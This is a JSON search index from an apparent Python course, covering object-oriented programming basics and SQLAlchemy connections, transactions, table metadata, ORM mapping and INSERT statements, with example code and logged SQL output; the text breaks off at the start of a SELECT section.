    "text": "9.2 Introduction to OOP\nOOP is centered around objects, which are instances of classes. A class defines a blueprint for objects, encapsulating data (attributes) and behavior (methods).\n\n9.2.1 Key Concepts\n\nClass: A blueprint for creating objects. Defines a set of attributes and methods.\nObject: An instance of a class.\nAttributes: Data stored inside an object.\nMethods: Functions that operate on the data inside an object.",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#defining-classes-and-creating-objects",
    "href": "07_python_oop.html#defining-classes-and-creating-objects",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.3 Defining Classes and Creating Objects",
    "text": "9.3 Defining Classes and Creating Objects\n\n9.3.1 Defining a Class\nIn Python, a class is defined using the class keyword.\nclass Employee:\n    pass\n\n\n9.3.2 Creating an Object\nAn object is created by calling the class.\nemp1 = Employee()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#attributes-and-methods-1",
    "href": "07_python_oop.html#attributes-and-methods-1",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.4 Attributes and Methods",
    "text": "9.4 Attributes and Methods\n\n9.4.1 Attributes\nAttributes are variables that belong to an object.\nclass Employee:\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n\n\n9.4.2 Methods\nMethods are functions defined inside a class.\nclass Employee:\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n    \n    def display_info(self):\n        print(f\"Name: {self.name}, ID: {self.id}\")\n\nemp1 = Employee(\"John Doe\", 101)\nemp1.display_info()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#encapsulation-1",
    "href": "07_python_oop.html#encapsulation-1",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.5 Encapsulation",
    "text": "9.5 Encapsulation\nEncapsulation is the bundling of data and methods within a class. It restricts access to some of the object’s components, which can prevent the accidental modification of data.\n\n9.5.1 Example\nclass Employee:\n    def __init__(self, name, id):\n        self.__name = name  # Private attribute\n        self.__id = id      # Private attribute\n    \n    def display_info(self):\n        print(f\"Name: {self.__name}, ID: {self.__id}\")\n\n    def set_name(self, name):\n        self.__name = name\n\n    def get_name(self):\n        return self.__name\n\nemp1 = Employee(\"John Doe\", 101)\nemp1.display_info()\nemp1.set_name(\"Jane Doe\")\nprint(emp1.get_name())",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#inheritance-1",
    "href": "07_python_oop.html#inheritance-1",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.6 Inheritance",
    "text": "9.6 Inheritance\nInheritance allows a class (child class) to inherit attributes and methods from another class (parent class).\n\n9.6.1 Example\nclass Employee:\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n    \n    def display_info(self):\n        print(f\"Name: {self.name}, ID: {self.id}\")\n\nclass Manager(Employee):\n    def __init__(self, name, id, department):\n        super().__init__(name, id)\n        self.department = department\n    \n    def display_info(self):\n        super().display_info()\n        print(f\"Department: {self.department}\")\n\nmgr1 = Manager(\"Alice Smith\", 102, \"IT\")\nmgr1.display_info()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#polymorphism-1",
    "href": "07_python_oop.html#polymorphism-1",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.7 Polymorphism",
    "text": "9.7 Polymorphism\nPolymorphism allows methods to be used in different ways, often by overriding them in derived classes.\n\n9.7.1 Example\nclass Employee:\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n    \n    def display_info(self):\n        print(f\"Name: {self.name}, ID: {self.id}\")\n\nclass Manager(Employee):\n    def __init__(self, name, id, department):\n        super().__init__(name, id)\n        self.department = department\n    \n    def display_info(self):\n        super().display_info()\n        print(f\"Department: {self.department}\")\n\nclass Intern(Employee):\n    def __init__(self, name, id, duration):\n        super().__init__(name, id)\n        self.duration = duration\n    \n    def display_info(self):\n        super().display_info()\n        print(f\"Internship Duration: {self.duration} months\")\n\nemployees = [Manager(\"Alice Smith\", 102, \"IT\"), Intern(\"Bob Brown\", 103, 6)]\n\nfor employee in employees:\n    employee.display_info()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#using-oop-in-business-analytics",
    "href": "07_python_oop.html#using-oop-in-business-analytics",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.8 Using OOP in Business Analytics",
    "text": "9.8 Using OOP in Business Analytics\nOOP can be used to model and manage complex data structures and processes in business analytics.\n\n9.8.1 Example: Data Analysis Classes\nclass DataSource:\n    def __init__(self, data):\n        self.data = data\n\n    def display_data(self):\n        print(self.data)\n\nclass DataAnalyzer:\n    def __init__(self, data_source):\n        self.data_source = data_source\n\n    def analyze(self):\n        # Placeholder for analysis logic\n        print(\"Analyzing data...\")\n\nclass ReportGenerator:\n    def __init__(self, data_analyzer):\n        self.data_analyzer = data_analyzer\n\n    def generate_report(self):\n        # Placeholder for report generation logic\n        print(\"Generating report...\")\n\ndata = [1, 2, 3, 4, 5]\ndata_source = DataSource(data)\nanalyzer = DataAnalyzer(data_source)\nreport_gen = ReportGenerator(analyzer)\n\ndata_source.display_data()\nanalyzer.analyze()\nreport_gen.generate_report()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#practical-examples",
    "href": "07_python_oop.html#practical-examples",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.9 Practical Examples",
    "text": "9.9 Practical Examples\n\n9.9.1 Example 1: Customer Relationship Management (CRM)\nclass Customer:\n    def __init__(self, customer_id, name, email):\n        self.customer_id = customer_id\n        self.name = name\n        self.email = email\n\n    def display_info(self):\n        print(f\"Customer ID: {self.customer_id}, Name: {self.name}, Email: {self.email}\")\n\nclass Order:\n    def __init__(self, order_id, customer, total):\n        self.order_id = order_id\n        self.customer = customer\n        self.total = total\n\n    def display_info(self):\n        print(f\"Order ID: {self.order_id}, Customer: {self.customer.name}, Total: {self.total}\")\n\ncust1 = Customer(1, \"John Doe\", \"john@example.com\")\norder1 = Order(101, cust1, 250.75)\n\ncust1.display_info()\norder1.display_info()\n\n\n9.9.2 Example 2: Inventory Management System\nclass Product:\n    def __init__(self, product_id, name, price):\n        self.product_id = product_id\n        self.name = name\n        self.price = price\n\n    def display_info(self):\n        print(f\"Product ID: {self.product_id}, Name: {self.name}, Price: {self.price}\")\n\nclass Inventory:\n    def __init__(self):\n        self.products = []\n\n    def add_product(self, product):\n        self.products.append(product)\n\n    def display_inventory(self):\n        for product in self.products:\n            product.display_info()\n\ninv = Inventory()\nprod1 = Product(201, \"Laptop\", 1200.50)\nprod2 = Product(202, \"Mouse\", 25.75)\n\ninv.add_product(prod1)\ninv.add_product(prod2)\ninv.display_inventory()",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#conclusion-1",
    "href": "07_python_oop.html#conclusion-1",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.10 Conclusion",
    "text": "9.10 Conclusion\nObject-Oriented Programming in Python provides a robust framework for modeling complex systems in business analytics and information systems. By understanding and applying concepts such as classes, objects, encapsulation, inheritance, and polymorphism, you can create modular, reusable, and maintainable code. This tutorial covered the basics and provided practical examples to help you get started with OOP in Python for BAIS applications. Happy coding!",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html",
    "href": "08_python_database_interaction.html",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "",
    "text": "9.0.1 Interacting with SQLite Databases using sqlite3\nSQLite is a C library that provides a lightweight, disk-based database. It doesn’t require a separate server process, making it an excellent choice for embedded systems and small applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#establishing-connectivity-with-sqlalchemy",
    "href": "08_python_database_interaction.html#establishing-connectivity-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.1 Establishing Connectivity with SQLAlchemy",
    "text": "9.1 Establishing Connectivity with SQLAlchemy\n\n9.1.1 Introduction to SQLAlchemy Engine\nEvery SQLAlchemy application that connects to a database needs to use an Engine. The Engine acts as a central source of connections to a particular database, providing both a factory and a holding space called a connection pool for these database connections. This tutorial will guide you through the process of establishing connectivity using the Engine, applicable to both ORM and Core users.\n\n\n9.1.2 Creating the Engine\nThe start of any SQLAlchemy application is an object called the Engine. The Engine is typically a global object created just once for a particular database server and is configured using a URL string that describes how it should connect to the database host or backend.\nFor this tutorial, we will use an in-memory-only SQLite database. This is an easy way to test things without needing a pre-existing database setup. The Engine is created using the create_engine() function:\nfrom sqlalchemy import create_engine\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\n\n\n9.1.3 Understanding the URL String\nThe main argument to create_engine is a string URL, in this case, passed as the string \"sqlite+pysqlite:///:memory:\". This string indicates three important facts to the Engine:\n\nDatabase Type: The type of database we are communicating with, specified by sqlite in the URL, links SQLAlchemy to an object known as the dialect.\nDBAPI: The Python DBAPI used to interact with the database. Here, pysqlite indicates that we are using the sqlite3 standard library interface for SQLite. If omitted, SQLAlchemy will use a default DBAPI for the selected database.\nDatabase Location: The phrase /:memory: indicates that we are using an in-memory-only database. This is perfect for experimenting as it does not require any server or create any new files.\n\n\n\n9.1.4 Lazy Connecting\nThe Engine, when first returned by create_engine(), has not actually tried to connect to the database yet; that happens only the first time it is asked to perform a task against the database. This design pattern is known as lazy initialization.\n\n\n9.1.5 Enabling SQL Logging\nWe have also specified a parameter echo=True in create_engine, which instructs the Engine to log all the SQL it emits to a Python logger that writes to standard output. This flag is a shorthand way of setting up Python logging and is useful for experimentation in scripts. Many of the SQL examples will include this SQL logging output beneath a [SQL] link that, when clicked, will reveal the full SQL interaction.\n\n\n9.1.6 Example: Connecting to an In-Memory SQLite Database\nHere’s a complete example of how to create an Engine and connect to an in-memory SQLite database:\nfrom sqlalchemy import create_engine\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\n\n# Perform a simple database operation\nwith engine.connect() as connection:\n    result = connection.execute(\"SELECT 'Hello, World!'\")\n    print(result.fetchall())\n\n\n9.1.7 Conclusion\nIn this tutorial, we have covered the basics of establishing connectivity with SQLAlchemy using the Engine. We created an Engine for an in-memory SQLite database, understood the components of the connection URL, and enabled SQL logging for better visibility into the SQL operations performed by SQLAlchemy. This foundational knowledge is essential for both ORM and Core users as it sets the stage for more advanced database interactions using SQLAlchemy.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#working-with-transactions-and-the-dbapi-with-sqlalchemy",
    "href": "08_python_database_interaction.html#working-with-transactions-and-the-dbapi-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.2 Working with Transactions and the DBAPI with SQLAlchemy",
    "text": "9.2 Working with Transactions and the DBAPI with SQLAlchemy\n\n9.2.1 Introduction\nWith the Engine object ready, we can dive into the basic operation of an Engine and its primary interactive endpoints: the Connection and the Result. For ORM users, the Session object manages the Engine and emphasizes a transactional SQL execution pattern similar to the Connection. This tutorial will cover how to establish a connection, execute transactions, and work with results using both Core and ORM contexts in SQLAlchemy.\n\n\n9.2.2 Establishing a Connection\nThe primary purpose of the Engine object is to provide a unit of connectivity to the database called the Connection. When working with SQLAlchemy Core, the Connection object is the primary interface for interacting with the database.\n\n9.2.2.1 Creating a Connection\nA Connection object can be created using the engine.connect() method. It’s best to use a context manager to ensure the connection is properly managed and closed.\nfrom sqlalchemy import create_engine, text\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\n\n# Establishing a connection using a context manager\nwith engine.connect() as conn:\n    result = conn.execute(text(\"SELECT 'hello world'\"))\n    print(result.all())\n\n\n\n9.2.3 Transactions\nTransactions are crucial for maintaining data integrity. By default, a transaction is always in progress, and a ROLLBACK is issued when the connection scope is released.\n\n9.2.3.1 Committing Changes\nTo commit changes, use the Connection.commit() method within the context block.\nwith engine.connect() as conn:\n    conn.execute(text(\"CREATE TABLE some_table (x int, y int)\"))\n    conn.execute(\n        text(\"INSERT INTO some_table (x, y) VALUES (:x, :y)\"),\n        [{\"x\": 1, \"y\": 1}, {\"x\": 2, \"y\": 4}]\n    )\n    conn.commit()\n\n\n9.2.3.2 Begin Once Style\nAlternatively, use engine.begin() to manage the connection and transaction scope automatically.\nwith engine.begin() as conn:\n    conn.execute(\n        text(\"INSERT INTO some_table (x, y) VALUES (:x, :y)\"),\n        [{\"x\": 6, \"y\": 8}, {\"x\": 9, \"y\": 10}]\n    )\n\n\n\n9.2.4 Statement Execution\nSQL statements can be executed using the Connection.execute() method along with the text() construct.\n\n9.2.4.1 Fetching Rows\nResults are fetched using the Result object, which supports various methods for accessing data.\nwith engine.connect() as conn:\n    result = conn.execute(text(\"SELECT x, y FROM some_table\"))\n    for row in result:\n        print(f\"x: {row.x}  y: {row.y}\")\n\n\n\n9.2.5 Parameterized Queries\nParameters can be passed to SQL statements using dictionaries, ensuring proper value sanitization and preventing SQL injection.\nwith engine.connect() as conn:\n    result = conn.execute(text(\"SELECT x, y FROM some_table WHERE y &gt; :y\"), {\"y\": 2})\n    for row in result:\n        print(f\"x: {row.x}  y: {row.y}\")\n\n\n9.2.6 Sending Multiple Parameters\nMultiple parameter sets can be sent using a list of dictionaries, enabling efficient execution of multiple SQL statements.\nwith engine.connect() as conn:\n    conn.execute(\n        text(\"INSERT INTO some_table (x, y) VALUES (:x, :y)\"),\n        [{\"x\": 11, \"y\": 12}, {\"x\": 13, \"y\": 14}]\n    )\n    conn.commit()\n\n\n9.2.7 Using ORM Session\nThe Session object in SQLAlchemy ORM provides a higher-level interface for managing database interactions.\n\n9.2.7.1 Executing with ORM Session\nfrom sqlalchemy.orm import Session\n\nstmt = text(\"SELECT x, y FROM some_table WHERE y &gt; :y ORDER BY x, y\")\nwith Session(engine) as session:\n    result = session.execute(stmt, {\"y\": 6})\n    for row in result:\n        print(f\"x: {row.x}  y: {row.y}\")\n\n\n9.2.7.2 Committing Changes with ORM Session\nwith Session(engine) as session:\n    session.execute(\n        text(\"UPDATE some_table SET y=:y WHERE x=:x\"),\n        [{\"x\": 9, \"y\": 11}, {\"x\": 13, \"y\": 15}]\n    )\n    session.commit()\n\n\n\n9.2.8 Conclusion\nThis tutorial covered the basics of working with transactions and the DBAPI using SQLAlchemy. We demonstrated how to establish a connection, execute transactions, and work with results using both Core and ORM contexts. Understanding these foundational concepts will enable you to effectively manage database interactions in your SQLAlchemy applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#working-with-database-metadata-with-sqlalchemy",
    "href": "08_python_database_interaction.html#working-with-database-metadata-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.3 Working with Database Metadata with SQLAlchemy",
    "text": "9.3 Working with Database Metadata with SQLAlchemy\n\n9.3.1 Introduction\nWith the basics of engines and SQL execution covered, we can now delve into SQLAlchemy’s core strength: working with database metadata. Database metadata allows for fluent, composable construction of SQL queries using Python objects that represent database concepts like tables and columns. This tutorial will illustrate how to work with database metadata in both Core and ORM contexts.\n\n\n9.3.2 Setting Up Metadata with Table Objects\nIn SQLAlchemy, the primary object representing a table is the Table object. To start using SQLAlchemy’s Expression Language, we need to construct Table objects that represent our database tables. This is done using the MetaData object, which acts as a collection for Table objects.\n\n9.3.2.1 Creating a MetaData Object\nFirst, create a MetaData object:\nfrom sqlalchemy import MetaData\n\nmetadata_obj = MetaData()\n\n\n9.3.2.2 Defining Table Objects\nWe can now define Table objects. For this tutorial, we will use a user_account table and an address table.\nfrom sqlalchemy import Table, Column, Integer, String, ForeignKey\n\n# Define the user_account table\nuser_table = Table(\n    \"user_account\",\n    metadata_obj,\n    Column(\"id\", Integer, primary_key=True),\n    Column(\"name\", String(30)),\n    Column(\"fullname\", String),\n)\n\n# Define the address table with a foreign key to user_account\naddress_table = Table(\n    \"address\",\n    metadata_obj,\n    Column(\"id\", Integer, primary_key=True),\n    Column(\"user_id\", ForeignKey(\"user_account.id\"), nullable=False),\n    Column(\"email_address\", String, nullable=False),\n)\n\n\n\n9.3.3 Emitting DDL to the Database\nWith our Table objects defined, we can create the actual tables in the database using the MetaData.create_all() method.\nfrom sqlalchemy import create_engine\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\n\n# Create the tables in the database\nmetadata_obj.create_all(engine)\n\n\n9.3.4 Working with Constraints\nConstraints such as primary keys and foreign keys can be defined using the Column object parameters and ForeignKey objects.\n\n9.3.4.1 Primary Key Constraint\nThe primary key is defined using the primary_key parameter in the Column definition.\nColumn(\"id\", Integer, primary_key=True)\n\n\n9.3.4.2 Foreign Key Constraint\nA foreign key constraint is defined using the ForeignKey object.\nColumn(\"user_id\", ForeignKey(\"user_account.id\"), nullable=False)\n\n\n\n9.3.5 Declaring ORM Mapped Classes\nUsing the ORM, we can define our tables and mapped classes using the DeclarativeBase class.\n\n9.3.5.1 Establishing a Declarative Base\nfrom sqlalchemy.orm import DeclarativeBase\n\nclass Base(DeclarativeBase):\n    pass\n\n\n9.3.5.2 Defining Mapped Classes\nWe can now define our ORM mapped classes User and Address.\nfrom typing import List, Optional\nfrom sqlalchemy.orm import Mapped, mapped_column, relationship\n\nclass User(Base):\n    __tablename__ = \"user_account\"\n\n    id: Mapped[int] = mapped_column(primary_key=True)\n    name: Mapped[str] = mapped_column(String(30))\n    fullname: Mapped[Optional[str]]\n\n    addresses: Mapped[List[\"Address\"]] = relationship(back_populates=\"user\")\n\n    def __repr__(self) -&gt; str:\n        return f\"User(id={self.id!r}, name={self.name!r}, fullname={self.fullname!r})\"\n\nclass Address(Base):\n    __tablename__ = \"address\"\n\n    id: Mapped[int] = mapped_column(primary_key=True)\n    email_address: Mapped[str]\n    user_id = mapped_column(ForeignKey(\"user_account.id\"))\n\n    user: Mapped[User] = relationship(back_populates=\"addresses\")\n\n    def __repr__(self) -&gt; str:\n        return f\"Address(id={self.id!r}, email_address={self.email_address!r})\"\n\n\n\n9.3.6 Emitting DDL from ORM Mapped Classes\nTo create tables from our ORM mapped classes, use the Base.metadata.create_all() method.\n# Create the tables in the database\nBase.metadata.create_all(engine)\n\n\n9.3.7 Table Reflection\nTable reflection generates Table objects from an existing database schema.\n\n9.3.7.1 Reflecting Tables\n# Reflect the some_table from the existing database\nsome_table = Table(\"some_table\", metadata_obj, autoload_with=engine)\nprint(some_table)\n\n\n\n9.3.8 Next Steps\nWith our database schema defined and tables created, we can now proceed to create, manipulate, and select data using both Core and ORM constructs in SQLAlchemy.\n\n\n9.3.9 Conclusion\nThis tutorial covered the basics of working with database metadata in SQLAlchemy, including defining tables, emitting DDL to the database, and using ORM mapped classes. Understanding these concepts is fundamental for effective database management and query construction in SQLAlchemy.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#working-with-data-with-sqlalchemy",
    "href": "08_python_database_interaction.html#working-with-data-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.4 Working with Data with SQLAlchemy",
    "text": "9.4 Working with Data with SQLAlchemy\nIn the previous tutorials, we covered interacting with the Python DBAPI and its transactional state, and representing database tables, columns, and constraints using SQLAlchemy’s MetaData and related objects. In this tutorial, we’ll combine these concepts to create, select, and manipulate data within a relational database. Interactions with the database are always within the context of a transaction, even if autocommit is used behind the scenes.\n\n9.4.1 Components of this Tutorial\n\nUsing INSERT Statements: We’ll introduce and demonstrate the Core Insert construct to get data into the database.\nUsing SELECT Statements: We’ll describe the Select construct, which emits SELECT statements for both Core and ORM-centric applications.\nUsing UPDATE and DELETE Statements: We’ll cover the use of the Update and Delete constructs from a Core perspective.\n\n\n\n9.4.2 Using INSERT Statements\nTo insert data into the database, we use the Core Insert construct.\n\n9.4.2.1 Example: Inserting Data with Core\nfrom sqlalchemy import create_engine, MetaData, Table, Column, Integer, String, insert\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\nmetadata = MetaData()\n\n# Define a user_account table\nuser_table = Table(\n    \"user_account\", metadata,\n    Column(\"id\", Integer, primary_key=True),\n    Column(\"name\", String(30)),\n    Column(\"fullname\", String)\n)\n\n# Create the table in the database\nmetadata.create_all(engine)\n\n# Insert data into the user_account table\nwith engine.connect() as conn:\n    stmt = insert(user_table).values(name=\"john\", fullname=\"John Doe\")\n    conn.execute(stmt)\n    conn.commit()\n\n\n\n9.4.3 Using SELECT Statements\nThe Select construct is the most commonly used object in SQLAlchemy, allowing us to query data from the database.\n\n9.4.3.1 Example: Selecting Data with Core\nfrom sqlalchemy import select\n\n# Select data from the user_account table\nwith engine.connect() as conn:\n    stmt = select(user_table)\n    result = conn.execute(stmt)\n    for row in result:\n        print(row)\n\n\n9.4.3.2 Example: Selecting Data with ORM\nFor ORM users, the process is similar but uses the Session object.\nfrom sqlalchemy.orm import Session\n\n# Define a user model\nclass User(Base):\n    __tablename__ = \"user_account\"\n    id = Column(Integer, primary_key=True)\n    name = Column(String(30))\n    fullname = Column(String)\n\n# Create a session\nwith Session(engine) as session:\n    stmt = select(User)\n    result = session.execute(stmt)\n    for user in result.scalars():\n        print(user.name, user.fullname)\n\n\n\n9.4.4 Using UPDATE and DELETE Statements\nTo update or delete data, we use the Update and Delete constructs.\n\n9.4.4.1 Example: Updating Data with Core\nfrom sqlalchemy import update\n\n# Update data in the user_account table\nwith engine.connect() as conn:\n    stmt = update(user_table).where(user_table.c.name == \"john\").values(fullname=\"Jonathan Doe\")\n    conn.execute(stmt)\n    conn.commit()\n\n\n9.4.4.2 Example: Deleting Data with Core\nfrom sqlalchemy import delete\n\n# Delete data from the user_account table\nwith engine.connect() as conn:\n    stmt = delete(user_table).where(user_table.c.name == \"john\")\n    conn.execute(stmt)\n    conn.commit()\n\n\n\n9.4.5 Data Manipulation with ORM\nFor ORM-specific data manipulation, we use the Session object.\n\n9.4.5.1 Example: Inserting Data with ORM\n# Insert data using ORM\nwith Session(engine) as session:\n    new_user = User(name=\"sandy\", fullname=\"Sandy Cheeks\")\n    session.add(new_user)\n    session.commit()\n\n\n9.4.5.2 Example: Updating Data with ORM\n# Update data using ORM\nwith Session(engine) as session:\n    stmt = update(User).where(User.name == \"sandy\").values(fullname=\"Sandra Cheeks\")\n    session.execute(stmt)\n    session.commit()\n\n\n9.4.5.3 Example: Deleting Data with ORM\n# Delete data using ORM\nwith Session(engine) as session:\n    stmt = delete(User).where(User.name == \"sandy\")\n    session.execute(stmt)\n    session.commit()\n\n\n\n9.4.6 Conclusion\nIn this tutorial, we covered the basics of creating, selecting, and manipulating data using SQLAlchemy. We demonstrated how to use the Core Insert, Select, Update, and Delete constructs, as well as their ORM equivalents. Understanding these concepts allows you to effectively manage data within your SQLAlchemy applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#using-insert-statements-with-sqlalchemy",
    "href": "08_python_database_interaction.html#using-insert-statements-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.5 Using INSERT Statements with SQLAlchemy",
    "text": "9.5 Using INSERT Statements with SQLAlchemy\nIn SQLAlchemy, whether using Core or the ORM, a SQL INSERT statement is generated directly using the insert() function. This function generates a new instance of Insert which represents an INSERT statement in SQL, adding new data into a table. This tutorial will detail how to use the Core methods for generating SQL INSERT statements to add new rows to a table. Understanding this process is useful even when using the ORM, as the ORM automates many of these steps.\n\n9.5.1 The insert() SQL Expression Construct\nThe insert() function creates an instance of the Insert construct, which represents an INSERT statement in SQL. Here’s a simple example:\nfrom sqlalchemy import create_engine, MetaData, Table, Column, Integer, String, insert\n\n# Create an in-memory SQLite database\nengine = create_engine(\"sqlite+pysqlite:///:memory:\", echo=True)\nmetadata = MetaData()\n\n# Define a user_account table\nuser_table = Table(\n    \"user_account\", metadata,\n    Column(\"id\", Integer, primary_key=True),\n    Column(\"name\", String(30)),\n    Column(\"fullname\", String)\n)\n\n# Create the table in the database\nmetadata.create_all(engine)\n\n# Create an INSERT statement\nstmt = insert(user_table).values(name=\"spongebob\", fullname=\"Spongebob Squarepants\")\nprint(stmt)\nOutput:\nINSERT INTO user_account (name, fullname) VALUES (:name, :fullname)\nThe stmt variable is an instance of Insert. The stringified form shows the general form of the SQL being produced. The statement is parameterized, meaning it uses placeholders for the values to be inserted.\n\n\n9.5.2 Executing the Statement\nTo execute the statement and insert data into the user_table, we use a connection object:\nwith engine.connect() as conn:\n    result = conn.execute(stmt)\n    conn.commit()\nThis will insert the row into the user_table. The SQL and the parameters used will be logged:\nBEGIN (implicit)\nINSERT INTO user_account (name, fullname) VALUES (?, ?)\n[...] ('spongebob', 'Spongebob Squarepants')\nCOMMIT\nTo get the primary key of the inserted row:\nprint(result.inserted_primary_key)\nOutput:\n(1,)\n\n\n9.5.3 Automatic VALUES Clause\nIf we don’t use Insert.values() and just print an “empty” statement, it will include all columns in the table:\nprint(insert(user_table))\nOutput:\nINSERT INTO user_account (id, name, fullname) VALUES (:id, :name, :fullname)\nWhen executing an empty Insert construct, the actual columns used in the INSERT are determined by the parameters passed to the Connection.execute() method:\nwith engine.connect() as conn:\n    result = conn.execute(\n        insert(user_table),\n        [\n            {\"name\": \"sandy\", \"fullname\": \"Sandy Cheeks\"},\n            {\"name\": \"patrick\", \"fullname\": \"Patrick Star\"}\n        ]\n    )\n    conn.commit()\nOutput:\nBEGIN (implicit)\nINSERT INTO user_account (name, fullname) VALUES (?, ?)\n[...] [('sandy', 'Sandy Cheeks'), ('patrick', 'Patrick Star')]\nCOMMIT\n\n\n9.5.4 INSERT with Subqueries\nFor more complex INSERTs, you can use subqueries. Here’s an example that uses a scalar subquery to insert data into the address_table based on data in the user_table:\nfrom sqlalchemy import select, bindparam\n\n# Define the address table\naddress_table = Table(\n    \"address\", metadata,\n    Column(\"id\", Integer, primary_key=True),\n    Column(\"user_id\", ForeignKey(\"user_account.id\"), nullable=False),\n    Column(\"email_address\", String, nullable=False)\n)\n\n# Create the table in the database\nmetadata.create_all(engine)\n\n# Scalar subquery\nscalar_subq = (\n    select(user_table.c.id)\n    .where(user_table.c.name == bindparam(\"username\"))\n    .scalar_subquery()\n)\n\n# Insert into address table using subquery\nwith engine.connect() as conn:\n    result = conn.execute(\n        insert(address_table).values(user_id=scalar_subq),\n        [\n            {\"username\": \"spongebob\", \"email_address\": \"spongebob@sqlalchemy.org\"},\n            {\"username\": \"sandy\", \"email_address\": \"sandy@sqlalchemy.org\"},\n            {\"username\": \"sandy\", \"email_address\": \"sandy@squirrelpower.org\"}\n        ]\n    )\n    conn.commit()\nOutput:\nBEGIN (implicit)\nINSERT INTO address (user_id, email_address) VALUES ((SELECT user_account.id FROM user_account WHERE user_account.name = ?), ?)\n[...] [('spongebob', 'spongebob@sqlalchemy.org'), ('sandy', 'sandy@sqlalchemy.org'), ('sandy', 'sandy@squirrelpower.org')]\nCOMMIT\n\n\n9.5.5 INSERT with RETURNING\nFor databases that support the RETURNING clause, you can use it to return values from the inserted row:\ninsert_stmt = insert(address_table).returning(address_table.c.id, address_table.c.email_address)\nprint(insert_stmt)\nOutput:\nINSERT INTO address (id, user_id, email_address) VALUES (:id, :user_id, :email_address) RETURNING address.id, address.email_address\nTo execute the statement and get the returned values:\nwith engine.connect() as conn:\n    result = conn.execute(insert_stmt)\n    for row in result:\n        print(row)\n\n\n9.5.6 INSERT from SELECT\nYou can also insert rows based on a SELECT statement using the Insert.from_select() method:\nselect_stmt = select(user_table.c.id, user_table.c.name + \"@aol.com\")\ninsert_stmt = insert(address_table).from_select([\"user_id\", \"email_address\"], select_stmt)\nprint(insert_stmt)\n\nwith engine.connect() as conn:\n    result = conn.execute(insert_stmt)\n    conn.commit()\nOutput:\nINSERT INTO address (user_id, email_address) SELECT user_account.id, user_account.name || :name_1 AS anon_1 FROM user_account\n\n\n9.5.7 Conclusion\nThis tutorial covered the basics of using the insert() function in SQLAlchemy to create SQL INSERT statements and add data to tables. We explored various ways to insert data, including basic inserts, inserts with subqueries, using the RETURNING clause, and inserting data from a SELECT statement. Understanding these concepts is essential for effective data manipulation in SQLAlchemy applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#using-select-statements-with-sqlalchemy",
    "href": "08_python_database_interaction.html#using-select-statements-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
